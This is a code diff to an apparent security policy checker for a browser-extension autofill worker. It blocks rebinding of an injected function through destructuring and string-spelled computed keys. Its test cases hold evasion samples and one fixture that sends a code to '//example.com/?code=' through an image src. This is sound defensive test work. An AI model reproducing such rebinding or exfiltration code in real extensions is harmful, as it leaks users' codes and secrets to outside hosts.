@@ -99,11 +99,12 @@ const MANIFEST_POLICY = Object.freeze({
   ],
   // The only functions a scripting file may inject into a page (executeScript with func: <name>).
   // Each must be declared once, at the top level, as function <name>(...) { ... } in a scripting
-  // file, and the name may appear nowhere else in the file but as func: <name> (no assignment,
-  // second binding or shadowing parameter or local, which would make func: inject other code).
+  // file, and the name may appear nowhere else in the file but as the func: value in the options
+  // literal of an executeScript call (no assignment, destructuring target, second binding or
+  // shadowing parameter or local, which would make func: inject other code).
   // Its text is held to the content-script lists below, since it runs in the page as the content
   // script does. A scripting file may not name `files` or `css` at all (no files injected, no CSS
-  // injected or registered).
+  // injected or registered), nor spell a computed key or member access with a string or template.
   injectedFunctions: ['fillFocused'],
   // The reads an injected function may make on top of the content-script lists, written as
   // <global>.<member> with the global named bare, and only as reads (a write fails): fillFocused
@@ -894,9 +895,10 @@ function contentScriptHits(text, label, { reads = [] } = {}) {
 //   a file that registers content scripts without a readable `js:` key, is a hit.
 // - Injection: `func:` may name only one of injectedFunctions; each of those found here
 //   (function <name>(...) { ... }) is held to contentScriptHits, must be declared at the top level,
-//   and its name may stand nowhere else but as a func: value (any other unqualified use, such as
-//   an assignment, a second binding or a shadowing parameter or local, is a hit); `files` and
-//   `css` may not appear at all.
+//   and its name may stand nowhere else but as the func: value of a parsed executeScript options
+//   literal (any other unqualified use, such as an assignment, a destructuring target, a second
+//   binding or a shadowing parameter or local, is a hit); `files` and `css` may not appear at
+//   all, and no computed key or member access is spelled with a string or template.
 // → { hits: [hit], named: [path], injected: Map(name -> times declared) }
 function scriptingFileHits(text, label) {
   const { tokens, problems } = jsTokens(text);
@@ -980,7 +982,9 @@ function scriptingFileHits(text, label) {
     if (tokens[j]?.t === 'id' && tokens[j].v === 'export') j -= 1;
     return depth[k] === 0 && (j < 0 || isPunct(tokens[j], ';') || isPunct(tokens[j], '}'));
   };
-  // Token indices where an injected function's name may stand: its declaration and func: values.
+  // Token indices where an injected function's name may stand: its top-level declaration, and the
+  // func: value of the options literal of a chrome.scripting.executeScript( call that the call
+  // check below has parsed (nowhere else, so not a func: key in a destructuring pattern).
   const allowedUse = new Set();
   tokens.forEach((tok, k) => {
     const name = tokens[k + 1];
@@ -1013,14 +1017,24 @@ function scriptingFileHits(text, label) {
     if (!isKey) hits.push(`${at(tok)} func named other than as the func: key of an injection`);
     else if (!(value?.t === 'id' && injected.has(value.v) && (isPunct(tokens[k + 3], ',') || isPunct(tokens[k + 3], '}')))) {
       hits.push(`${at(tok)} func: ${value?.v ?? ''} is not one of injectedFunctions (${injectedFunctions.join(', ')})`);
-    } else allowedUse.add(k + 2);
+    }
   });
-  // Anywhere else an unqualified injected name could rebind what func: serializes (an
-  // assignment, var/let/const/class/import, a parameter, a destructuring target, a nested
-  // declaration). A text scan cannot list every binding form, so every other use is refused.
+  // A computed key or member access spelled with a string or template literal ({ [`func`]: f },
+  // o['fu' + 'nc'], globalThis['chr' + 'ome']) names a property that the checks here read only by
+  // its spelling, so in a scripting file a computed key or access may hold no string or template.
   tokens.forEach((tok, k) => {
-    if (tok.t !== 'id' || !injected.has(tok.v) || isDot(tokens[k - 1]) || allowedUse.has(k)) return;
-    hits.push(`${at(tok)} ${tok.v} named other than in its one top-level declaration and as func: ${tok.v} (an assignment, another binding or a shadowing local would inject other code)`);
+    if (!isPunct(tok, '[')) return;
+    const close = closingToken(tokens, k);
+    if (close < 0) return;
+    const prev = tokens[k - 1];
+    const after = tokens[close + 1];
+    const keyPosition =
+      (['{', ',', ';', '}', '*'].some((p) => isPunct(prev, p)) || (prev?.t === 'id' && ['static', 'get', 'set', 'async'].includes(prev.v))) &&
+      (isPunct(after, ':') || isPunct(after, '(') || isPunct(after, '='));
+    if (!keyPosition && !opensComputedAccess(prev)) return;
+    if (tokens.slice(k + 1, close).some((t) => t.t === 'str' || t.t === 'tpl')) {
+      hits.push(`${at(tok)} computed ${keyPosition ? 'key' : 'member access'} with a string or template key in a scripting file`);
+    }
   });
 
   // The calls themselves. An options object built anywhere but in the call (a variable, a call
@@ -1087,7 +1101,11 @@ function scriptingFileHits(text, label) {
     if (method.v === 'executeScript') {
       const props = objectProps(open, injectionKeys, ['args'], 'executeScript options');
       if (!props) return;
-      if (!props.has('func')) hits.push(`${at(tok)} ${shown} without func: (one of ${injectedFunctions.join(', ')})`);
+      const func = props.get('func');
+      if (!func) hits.push(`${at(tok)} ${shown} without func: (one of ${injectedFunctions.join(', ')})`);
+      else if (func.value && func.value[1] === func.value[0] + 1 && tokens[func.value[0]].t === 'id' && injected.has(tokens[func.value[0]].v)) {
+        allowedUse.add(func.value[0]);
+      }
       const target = props.get('target');
       if (target && !isObjectLiteral(tokens, target.value)) hits.push(`${at(target.at)} executeScript target: is not an object literal`);
       else if (target) objectProps(target.value[0], injectionTargetKeys, injectionTargetKeys, 'executeScript target');
@@ -1108,6 +1126,14 @@ function scriptingFileHits(text, label) {
       hits.push(`${at(tok)} ${name} (a content-script registration) named other than in its const declaration and as a registerContentScripts/updateContentScripts item`);
     });
   }
+  // Anywhere else an unqualified injected name could rebind what func: serializes (an
+  // assignment, var/let/const/class/import, a parameter, a destructuring target such as
+  // ({ func: fillFocused } = o), a nested declaration). A text scan cannot list every binding
+  // form, so every use but the declaration and a parsed executeScript func: value is refused.
+  tokens.forEach((tok, k) => {
+    if (tok.t !== 'id' || !injected.has(tok.v) || isDot(tokens[k - 1]) || allowedUse.has(k)) return;
+    hits.push(`${at(tok)} ${tok.v} named other than in its one top-level declaration and as the func: of an executeScript call (an assignment, a destructuring target, another binding or a shadowing local would inject other code)`);
+  });
   return { hits, named, injected };
 }
 
@@ -2457,7 +2483,8 @@ const CASES = [
   ['scripting-removecss', appendJs('lib/autofill-worker.js', 'export const unstyle = (o) => chrome.scripting.removeCSS(o);\n'), ['scripting-api'], /chrome\.scripting\.removeCSS is not one of scriptingMethods/],
   ['scripting-other-method-optional-chain', appendJs('lib/autofill-worker.js', 'export const style = (o) => chrome?.scripting?.insertCSS(o);\n'), ['scripting-api'], /insertCSS is not one of scriptingMethods/],
   ['scripting-alias-in-worker', appendJs('lib/autofill-worker.js', 'const s = chrome.scripting;\nexport const style = (o) => s.insertCSS(o);\n'), ['scripting-api'], /chrome\.scripting used other than as chrome\.scripting\.<method>/],
-  ['scripting-computed-in-worker', appendJs('lib/autofill-worker.js', "export const style = (o) => chrome.scripting['insertCSS'](o);\n"), ['scripting-api'], /chrome\.scripting used other than as chrome\.scripting\.<method>/],
+  // Also a member access spelled with a string, which no scripting file may write.
+  ['scripting-computed-in-worker', appendJs('lib/autofill-worker.js', "export const style = (o) => chrome.scripting['insertCSS'](o);\n"), ['scripting-api', 'content-script-sinks'], /chrome\.scripting used other than as chrome\.scripting\.<method>/],
   ['scripting-destructure-in-worker', appendJs('lib/autofill-worker.js', 'const { insertCSS } = chrome.scripting;\n'), ['scripting-api'], /chrome\.scripting used other than/],
   // A comment between chrome.scripting and the method hides the member from the raw-text scan.
   ['scripting-comment-before-dot-in-worker', appendJs('lib/autofill-worker.js', 'export const style = (o) => chrome.scripting /* x */ .insertCSS(o);\n'), ['scripting-api'], /chrome\.scripting\.insertCSS is not one of scriptingMethods/],
@@ -2483,6 +2510,43 @@ const CASES = [
   ['injected-redeclared-class', appendJs('lib/autofill-worker.js', 'class fillFocused {}\n'), ['content-script-sinks'], /fillFocused named other than/],
   ['injected-redeclared-import', editWorker("import { openOwnWindow } from './nav.js';", "import { openOwnWindow, openOwnWindow as fillFocused } from './nav.js';"), ['content-script-sinks'], /fillFocused named other than/],
   ['injected-destructured-rebind', appendJs('lib/autofill-worker.js', '[fillFocused] = [grab];\n'), ['content-script-sinks'], /fillFocused named other than/],
+  // fillFocused may stand as func: only inside the options literal of an executeScript call; a
+  // func: fillFocused in a destructuring pattern rebinds it (round-2 reviewer mutation, verbatim).
+  [
+    'injected-destructured-func-key',
+    appendJs(
+      'lib/autofill-worker.js',
+      "const replacement = {\n  [`func`]: (code) => {\n    document.querySelector('img').src = '//example.com/?code=' + code;\n  }\n};\n({ func: fillFocused } = replacement);\n",
+    ),
+    ['content-script-sinks'],
+    /fillFocused named other than in its one top-level declaration and as the func: of an executeScript call/,
+  ],
+  ['injected-destructured-func-key-plain-object', appendJs('lib/autofill-worker.js', '({ func: fillFocused } = replacement);\n'), ['content-script-sinks'], /fillFocused named other than in its one top-level declaration/],
+  ['injected-destructured-array-x', appendJs('lib/autofill-worker.js', '[fillFocused] = [x];\n'), ['content-script-sinks'], /fillFocused named other than/],
+  [
+    'injected-shadowed-const-destructure',
+    editWorker('  const frameIds = [info.frameId ?? 0];', '  const frameIds = [info.frameId ?? 0];\n  const { func: fillFocused } = x;'),
+    ['content-script-sinks'],
+    /fillFocused named other than/,
+  ],
+  ['injected-shadowed-param-destructure', editWorker('export async function handleMenuClick(info, tab) {', 'export async function handleMenuClick(info, tab, { func: fillFocused } = x) {'), ['content-script-sinks'], /fillFocused named other than/],
+  ['injected-destructured-for-of', appendJs('lib/autofill-worker.js', 'for ({ func: fillFocused } of list) break;\n'), ['content-script-sinks'], /fillFocused named other than/],
+  // The func: value is authorized only as a whole value of the call's own options literal.
+  ['injected-func-value-assignment', editInjection("await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, func: fillFocused = grab, args: ['123456'] });"), ['content-script-sinks'], /fillFocused named other than/],
+  [
+    'injected-func-in-nested-pattern',
+    editInjection("await chrome.scripting.executeScript({ target: { tabId: tab.id, frameIds }, func: fillFocused, args: [({ func: fillFocused } = replacement)] });"),
+    ['content-script-sinks'],
+    /fillFocused named other than/,
+  ],
+  // In a scripting file a computed key or member access is never spelled with a string or a
+  // template: it would name func, js or chrome where the checks read them only by spelling.
+  ['scripting-template-computed-key', appendJs('lib/autofill-worker.js', 'const replacement = { [`func`]: grab };\n'), ['content-script-sinks'], /computed key with a string or template key in a scripting file/],
+  ['scripting-string-computed-key', appendJs('lib/autofill-worker.js', "const replacement = { ['fu' + 'nc']: grab };\n"), ['content-script-sinks'], /computed key with a string or template key in a scripting file/],
+  ['scripting-string-computed-pattern-key', appendJs('lib/autofill-worker.js', "const { ['func']: pick } = replacement;\n"), ['content-script-sinks'], /computed key with a string or template key in a scripting file/],
+  ['scripting-string-member-access', appendJs('lib/autofill-worker.js', "export const api = () => globalThis['chr' + 'ome'];\n"), ['content-script-sinks'], /computed member access with a string or template key in a scripting file/],
+  ['scripting-string-member-write', appendJs('lib/autofill-worker.js', "export function widen(options) { options['fu' + 'nc'] = grab; }\n"), ['content-script-sinks'], /computed member access with a string or template key in a scripting file/],
+  ['ok-scripting-string-arrays-and-identifier-keys', appendJs('lib/autofill-worker.js', "const MODES = ['a', `b`];\nconst pairs = [['k', 1], ['l', 2]];\nexport const pick = (o, key) => o[key] ?? MODES[0] ?? pairs[1];\n"), []],
   ['injected-shadowed-param', editWorker('export async function handleMenuClick(info, tab) {', 'export async function handleMenuClick(info, tab, fillFocused = grab) {'), ['content-script-sinks'], /fillFocused named other than/],
   [
     'injected-shadowed-local',
